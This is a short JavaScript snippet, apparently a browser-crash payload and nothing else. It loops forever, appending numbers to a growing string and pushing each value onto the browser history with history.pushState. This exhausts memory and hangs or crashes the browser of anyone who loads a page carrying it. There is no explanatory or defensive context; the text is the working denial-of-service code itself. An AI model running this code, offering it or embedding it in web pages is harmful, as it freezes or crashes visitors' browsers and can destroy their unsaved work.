var total = "";
var i=0;
while (true) {
  total = total + i.toString();
  history.pushState(0, 0, total);
  i++;
}